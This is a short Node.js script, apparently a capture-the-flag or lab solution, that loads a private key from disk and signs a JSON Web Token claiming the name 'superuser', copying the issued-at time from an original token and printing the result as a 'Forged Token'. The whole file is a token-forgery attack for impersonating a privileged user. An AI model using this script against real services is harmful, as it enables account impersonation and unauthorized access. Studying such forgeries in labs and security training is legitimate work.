const fs = require('fs');
const jwt = require('jsonwebtoken');
const privateKey = fs.readFileSync('./private.key');

// Replace the IAT value with that the original decoded token
const token = jwt.sign({ name: "superuser", iat: 1746856438 }, privateKey, { algorithm: 'RS256' });
console.log("Forged Token:\n", token);
const decoded = jwt.decode(token, { complete: true });
console.log("Decoded Payload:\n", decoded.payload);
console.log("Name: ", decoded.payload.name);
